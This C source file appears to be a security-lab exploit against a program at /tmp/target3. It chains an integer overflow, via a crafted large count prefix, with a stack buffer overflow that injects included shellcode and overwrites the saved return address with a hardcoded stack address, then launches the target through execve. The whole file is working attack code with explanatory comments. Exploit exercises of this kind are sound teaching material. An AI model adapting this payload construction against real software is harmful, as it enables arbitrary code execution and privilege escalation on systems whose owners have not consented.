#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
We define constants here, including the return address we
found manually. We know the from examining the assembly
that the base pointer is at 0xeb88 and the bottom of the
buffer is at 0xd8c8. Then this amount, plus the base pointer
and return address must be overwritten on the stack.
We also let prefix be a specific value that is negative as
an integer, but overflows to the buffer size we need when
multiplied by sizeof(struct widget_t) (which is 20)
*/
#define TARGET "/tmp/target3"
#define FILLER "A"
#define PAD_DIST 0xeb88 - 0xd8c8 // ebp and buf addresses
#define RETURN_ADDR "\xc8\xd8\xff\xbf"
#define OVERFLOW_SIZE PAD_DIST + (2*PTR_SPACE)
#define PTR_SPACE sizeof(void*)
#define PREFIX "2147483889," 


void ncat(int n, char *str, char *pad)
{
  int i;
  for (i=0; i<n; i++)
    {
      strcat(str, pad);
    }
}

int main(void)
{
  char *args[3];
  char *env[1];

  // We write the prefix, but leave space for the overflow
  char input[OVERFLOW_SIZE+strlen(PREFIX)] = PREFIX;

  /*
  We construct the string so that the shellcode is at the
  lowest address of the buffer and fill with padding until
  we can overwrite the return address.
  */
  strcat(input, shellcode);
  int padlen = OVERFLOW_SIZE-strlen(shellcode)-PTR_SPACE;
  ncat(padlen, input, FILLER);
  strcat(input, RETURN_ADDR);

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
